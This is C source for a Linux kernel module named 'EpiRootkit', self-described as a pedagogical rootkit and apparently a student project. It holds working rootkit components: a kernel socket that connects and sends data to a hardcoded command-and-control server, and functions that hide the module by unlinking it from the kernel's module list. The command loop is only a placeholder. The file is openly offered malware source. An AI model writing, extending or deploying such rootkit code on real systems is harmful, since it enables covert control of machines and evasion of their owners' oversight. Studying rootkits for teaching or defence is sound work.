#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/list.h>
#include <linux/uio.h>
#include <linux/security.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;
static int connection_state = 0;
static unsigned long last_reconnect_attempt = 0;
#define RECONNECT_DELAY_MS 3000

static struct list_head *prev_module = NULL;

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_INFO "epirootkit: Module hidden from list\n");
}

static void unhide_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
        printk(KERN_INFO "epirootkit: Module unhidden\n");
    }
}

static int connect_to_c2_server(void) {
    struct sockaddr_in server;
    int err;

    err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (err < 0) {
        pr_err("epirootkit: socket creation failed (%d)\n", err);
        return err;
    }

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr.s_addr = in_aton(config.server_ip);

    err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
                               sizeof(server), O_NONBLOCK);
    if (err && err != -EINPROGRESS) {
        pr_err("epirootkit: connect failed (%d)\n", err);
        sock_release(g_sock);
        g_sock = NULL;
        return err;
    }

    pr_info("epirootkit: Connected to C2 server at %s:%d\n",
            config.server_ip, config.port);

    return 0;
}

static int send_to_c2(const char *msg, size_t len) {
    struct kvec iov;
    struct msghdr msg_hdr = {0};
    int sent;

    if (!g_sock)
        return -ENOTCONN;

    iov.iov_base = (char *)msg;
    iov.iov_len = len;

    sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
    if (sent < 0) {
        pr_err("epirootkit: failed to send data (%d)\n", sent);
        return sent;
    }

    pr_info("epirootkit: sent %d bytes to C2\n", sent);
    return 0;
}


// Implémentation minimale pour compilation
static int command_loop(void *data) {
    pr_info("epirootkit: Dummy command_loop started\n");
    while (!kthread_should_stop()) {
        ssleep(1);
    }
    pr_info("epirootkit: Dummy command_loop stopping\n");
    return 0;
}

static int __init epirootkit_init(void) {
    int err;

    pr_info("epirootkit: Initializing...\n");

    g_sock = NULL;
    g_thread = NULL;
    connection_state = 0;
    prev_module = NULL;

    err = connect_to_c2_server();
    if (err < 0) {
        pr_err("epirootkit: Failed to connect to C2 server\n");
        return err;
    }

    g_thread = kthread_run(command_loop, NULL, "rk");
    if (IS_ERR(g_thread)) {
        pr_err("epirootkit: Failed to create command thread\n");
        sock_release(g_sock);
        g_sock = NULL;
        return PTR_ERR(g_thread);
    }

    notify_connection_state(1);
    send_to_c2("Comment aimez-vous votre blanquette ?\n", 6);
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");

    if (g_thread) {
        pr_info("epirootkit: Stopping thread...\n");
        kthread_stop(g_thread);
        g_thread = NULL;
    }

    if (g_sock) {
        pr_info("epirootkit: Closing socket...\n");
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    if (prev_module && THIS_MODULE) {
        pr_info("epirootkit: Unhiding module...\n");
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
    }

    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
